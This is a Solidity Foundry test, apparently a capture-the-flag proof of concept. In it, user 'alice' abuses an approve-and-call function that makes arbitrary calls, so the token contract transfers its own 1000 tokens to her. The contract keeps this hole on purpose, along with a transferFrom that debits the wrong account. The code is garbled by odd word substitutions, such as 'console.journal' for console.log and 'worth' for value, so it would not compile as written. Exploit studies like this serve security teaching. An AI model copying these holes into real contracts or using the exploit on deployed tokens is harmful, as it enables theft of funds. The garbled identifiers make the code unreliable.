pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PactTest is Test {
    CoinWhale GemWhalePact;

    function testAltSummonhero() public {
        address alice = vm.addr(1);
        GemWhalePact = new CoinWhale();
        GemWhalePact.MedalWhaleDeploy(address(GemWhalePact));
        console.journal(
            "TokenWhale balance:",
            GemWhalePact.balanceOf(address(GemWhalePact))
        );


        console.journal(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        GemWhalePact.authorizespendingAndCallcode(
            address(GemWhalePact),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(GemWhalePact.balanceOf(address(alice)), 1000);
        console.journal("operate completed");
        console.journal(
            "TokenWhale balance:",
            GemWhalePact.balanceOf(address(GemWhalePact))
        );
        console.journal(
            "Alice balance:",
            GemWhalePact.balanceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract CoinWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function MedalWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function validateComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed source, address indexed to, uint256 worth);

    function _transfer(address to, uint256 worth) internal {
        balanceOf[msg.sender] -= worth;
        balanceOf[to] += worth;

        emit Transfer(msg.sender, to, worth);
    }

    function transfer(address to, uint256 worth) public {
        require(balanceOf[msg.sender] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);

        _transfer(to, worth);
    }

    event PermissionGranted(
        address indexed owner,
        address indexed user,
        uint256 worth
    );

    function approve(address user, uint256 worth) public {
        allowance[msg.sender][user] = worth;
        emit PermissionGranted(msg.sender, user, worth);
    }

    function transferFrom(address source, address to, uint256 worth) public {
        require(balanceOf[source] >= worth);
        require(balanceOf[to] + worth >= balanceOf[to]);
        require(allowance[source][msg.sender] >= worth);

        allowance[source][msg.sender] -= worth;
        _transfer(to, worth);
    }


    function authorizespendingAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraInfo
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool victory;

        (victory, ) = _spender.call(_extraInfo);
        console.journal("success:", victory);
    }
}